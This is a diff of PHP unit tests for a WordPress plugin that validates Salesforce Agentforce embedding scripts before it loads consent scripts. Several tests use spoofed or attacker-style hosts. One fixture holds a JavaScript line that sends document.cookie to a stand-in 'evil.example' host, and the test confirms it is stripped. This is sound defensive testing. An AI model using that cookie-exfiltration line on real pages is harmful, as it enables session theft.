@@ -44,15 +44,35 @@ class Cmp_Tests extends WP_UnitTestCase {
 	}
 
 	private function get_embedding_script_fixture(): string {
+		return $this->embedding_script( 'https://example.my.site.com/assets/js/bootstrap.min.js' );
+	}
+
+	/**
+	 * Build a full embedding snippet (inline init + bootstrap loader) for tests.
+	 *
+	 * @param string               $bootstrap_src External bootstrap script src.
+	 * @param array<string, string> $overrides     Optional org_id/deployment_name/site_url/scrt_url/language overrides.
+	 * @return string
+	 */
+	private function embedding_script( string $bootstrap_src, array $overrides = array() ): string {
+		$org_id          = $overrides['org_id'] ?? '00Dxx0000001gPLEAY';
+		$deployment_name = $overrides['deployment_name'] ?? 'agentforce_deployment';
+		$site_url        = $overrides['site_url'] ?? 'https://example.my.site.com/ESWdemo';
+		$scrt_url        = $overrides['scrt_url'] ?? 'https://example.my.salesforce-scrt.com';
+		$language        = $overrides['language'] ?? 'en_US';
+
+		$inline = sprintf(
+			"function initEmbeddedMessaging(){embeddedservice_bootstrap.settings.language='%s';embeddedservice_bootstrap.init('%s','%s','%s',{scrt2URL:'%s'});}",
+			$language,
+			$org_id,
+			$deployment_name,
+			$site_url,
+			$scrt_url
+		);
+
 		// phpcs:disable WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
-		return <<<'HTML'
-<script type="text/javascript">
-function initEmbeddedMessaging() {
-	window.__agentforceInitCalled = true;
-}
-</script>
-<script type="text/javascript" src="https://example.local/assets/js/bootstrap.min.js" onload="initEmbeddedMessaging()"></script>
-HTML;
+		return '<script type="text/javascript">' . $inline . '</script>'
+			. '<script type="text/javascript" src="' . $bootstrap_src . '" onload="initEmbeddedMessaging()"></script>';
 		// phpcs:enable WordPress.WP.EnqueuedResources.NonEnqueuedScript
 	}
 
@@ -160,8 +180,7 @@ HTML;
 		$this->prime_configs_cache(
 			[
 				'agentforce_js_sdk_activated' => true,
-				// phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
-				'agentforce_embedding_script' => '<script>function initEmbeddedMessaging(){window.__agentforceInitCalled=true;}</script><script src="http://example.local/assets/js/bootstrap.min.js" onload="initEmbeddedMessaging()"></script>',
+				'agentforce_embedding_script' => $this->embedding_script( 'http://example.my.site.com/assets/js/bootstrap.min.js' ),
 			]
 		);
 
@@ -175,6 +194,317 @@ HTML;
 			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
 			'Consent script should not enqueue when bootstrap src is not HTTPS.'
 		);
+	}
+
+	public function test_consent_script_not_enqueued_when_bootstrap_host_not_allowed(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->embedding_script( 'https://attacker.example.com/assets/js/bootstrap.min.js' ),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue when bootstrap host is not Salesforce-owned.'
+		);
+	}
+
+	public function test_consent_script_not_enqueued_when_bootstrap_host_spoofs_allowed_suffix(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->embedding_script( 'https://evilsalesforce.com/assets/js/bootstrap.min.js' ),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue when host only suffix-matches an allowed domain.'
+		);
+	}
+
+	public function test_consent_script_not_enqueued_for_non_experience_cloud_site_com_host(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->embedding_script( 'https://foo.site.com/assets/js/bootstrap.min.js' ),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue for a bare *.site.com host; only *.my.site.com is allowed.'
+		);
+	}
+
+	public function test_consent_script_enqueued_when_bootstrap_host_allowed_via_filter(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->embedding_script( 'https://chat.acmecorp.com/assets/js/bootstrap.min.js' ),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		$filter = static function ( $suffixes ) {
+			$suffixes[] = 'acmecorp.com';
+			return $suffixes;
+		};
+		add_filter( 'vip_agentforce_allowed_bootstrap_hosts', $filter );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		remove_filter( 'vip_agentforce_allowed_bootstrap_hosts', $filter );
+
+		$this->assertTrue(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should enqueue when a custom host is allowed via filter.'
+		);
+	}
+
+	public function test_consent_script_enqueued_when_bootstrap_host_matches_configured_org(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'salesforce_instance_url'     => 'https://example.my.salesforce.com',
+				'agentforce_embedding_script' => $this->embedding_script( 'https://example.my.site.com/assets/js/bootstrap.min.js' ),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertTrue(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should enqueue when the bootstrap host belongs to the configured org.'
+		);
+	}
+
+	public function test_consent_script_not_enqueued_when_bootstrap_host_belongs_to_other_org(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'salesforce_instance_url'     => 'https://example.my.salesforce.com',
+				'agentforce_embedding_script' => $this->embedding_script( 'https://attacker.my.site.com/assets/js/bootstrap.min.js' ),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue when the bootstrap host is another tenant on a shared Salesforce domain.'
+		);
+	}
+
+	public function test_consent_script_enqueued_when_sandbox_bootstrap_host_matches_org(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'salesforce_instance_url'     => 'https://example--dev.sandbox.my.salesforce.com',
+				'agentforce_embedding_script' => $this->embedding_script(
+					'https://example--dev.sandbox.my.site.com/assets/js/bootstrap.min.js',
+					array(
+						'site_url' => 'https://example--dev.sandbox.my.site.com/ESWdemo',
+						'scrt_url' => 'https://example--dev.sandbox.my.salesforce-scrt.com',
+					)
+				),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertTrue(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should enqueue when a sandbox bootstrap host resolves to the configured org.'
+		);
+	}
+
+	public function test_consent_script_enqueued_when_org_pin_disabled_via_filter(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'salesforce_instance_url'     => 'https://example.my.salesforce.com',
+				'agentforce_embedding_script' => $this->embedding_script( 'https://community.my.site.com/assets/js/bootstrap.min.js' ),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		$filter = static function () {
+			return '';
+		};
+		add_filter( 'vip_agentforce_bootstrap_org_label', $filter );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		remove_filter( 'vip_agentforce_bootstrap_org_label', $filter );
+
+		$this->assertTrue(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should enqueue when the org pin is disabled via filter and the suffix allowlist still matches.'
+		);
+	}
+
+	public function test_consent_script_not_enqueued_when_inline_has_no_init_call(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				// phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
+				'agentforce_embedding_script' => '<script type="text/javascript">window.evilPayload=1;document.title="x";</script><script type="text/javascript" src="https://example.my.site.com/assets/js/bootstrap.min.js" onload="initEmbeddedMessaging()"></script>',
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue when the inline script has no recognizable init() call.'
+		);
+	}
+
+	public function test_consent_script_not_enqueued_when_org_id_invalid(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->embedding_script(
+					'https://example.my.site.com/assets/js/bootstrap.min.js',
+					array( 'org_id' => 'not-an-org-id' )
+				),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue when the org id is not a valid Salesforce org id.'
+		);
+	}
+
+	public function test_consent_script_not_enqueued_when_inline_site_url_not_salesforce(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->embedding_script(
+					'https://example.my.site.com/assets/js/bootstrap.min.js',
+					array( 'site_url' => 'https://evil.example.com/ESWdemo' )
+				),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue when the inline site URL is not a Salesforce host.'
+		);
+	}
+
+	public function test_consent_script_not_enqueued_when_inline_scrt_url_not_salesforce(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->embedding_script(
+					'https://example.my.site.com/assets/js/bootstrap.min.js',
+					array( 'scrt_url' => 'https://evil.example.com' )
+				),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertFalse(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should not enqueue when the inline scrt2URL is not a Salesforce host.'
+		);
+	}
+
+	public function test_inline_script_is_rebuilt_and_drops_untrusted_js(): void {
+		// Valid init() call wrapped in attacker-supplied JavaScript.
+		$inline = "function initEmbeddedMessaging(){window.location='https://evil.example/steal?c='+document.cookie;"
+			. "embeddedservice_bootstrap.settings.language='en_US';"
+			. "embeddedservice_bootstrap.init('00Dxx0000001gPLEAY','agentforce_deployment','https://example.my.site.com/ESWdemo',{scrt2URL:'https://example.my.salesforce-scrt.com'});}";
+
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				// phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
+				'agentforce_embedding_script' => '<script type="text/javascript">' . $inline . '</script><script type="text/javascript" src="https://example.my.site.com/assets/js/bootstrap.min.js" onload="initEmbeddedMessaging()"></script>',
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
+
+		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$this->assertTrue(
+			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
+			'Consent script should enqueue when a valid init() call is present.'
+		);
+
+		$inline_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'before' );
+		if ( is_array( $inline_data ) ) {
+			$inline_data = implode( "\n", $inline_data );
+		}
+		$inline_data = strval( $inline_data );
+
+		$this->assertStringContainsString( '00Dxx0000001gPLEAY', $inline_data, 'Rebuilt script should keep the validated org id.' );
+		$this->assertStringNotContainsString( 'evil.example', $inline_data, 'Rebuilt script must drop attacker-supplied JavaScript.' );
+		$this->assertStringNotContainsString( 'document.cookie', $inline_data, 'Rebuilt script must drop attacker-supplied JavaScript.' );
 	}
 
 	public function test_cookieyes_script_enqueued_with_localized_embedding_data(): void {
@@ -454,6 +784,25 @@ HTML;
 		$this->assertStringContainsString( '"cookiebotCategory":"' . Constants::DEFAULT_COOKIEBOT_CATEGORY . '"', $localized_data );
 	}
 
+	public function test_cookiebot_localization_falls_back_for_invalid_category(): void {
+		$this->prime_configs_cache(
+			[
+				'agentforce_js_sdk_activated' => true,
+				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
+			]
+		);
+
+		update_option( 'vip_agentforce_consent_type', 'CookieBot' );
+		update_option( 'vip_agentforce_cookiebot_category', 'custom-category' );
+
+		$this->reset_consent_script( 'vip-af-cookiebot-consent' );
+
+		Assets::get_instance()->enqueue_consent_scripts();
+
+		$localized_data = wp_scripts()->get_data( 'vip-af-cookiebot-consent', 'data' );
+		$this->assertStringContainsString( '"cookiebotCategory":"' . Constants::DEFAULT_COOKIEBOT_CATEGORY . '"', $localized_data );
+	}
+
 	public function test_cookieyes_localization_uses_default_category(): void {
 		$this->prime_configs_cache(
 			[
@@ -600,6 +949,13 @@ HTML;
 
 		$this->assertSame( Constants::DEFAULT_CMP, $settings->sanitize_consent_type( 'InvalidCMP' ) );
 		$this->assertSame( Constants::DEFAULT_CMP, $settings->sanitize_consent_type( 'onetrust' ) );
+	}
+
+	public function test_validate_cookiebot_category_normalizes_supported_values(): void {
+		$settings = Settings_Page::get_instance();
+
+		$this->assertSame( 'statistics', $settings->validate_cookiebot_category( ' Statistics ' ) );
+		$this->assertSame( Constants::DEFAULT_COOKIEBOT_CATEGORY, $settings->validate_cookiebot_category( 'custom-category' ) );
 	}
 
 	public function test_settings_page_renders_react_root_with_serialized_values(): void {
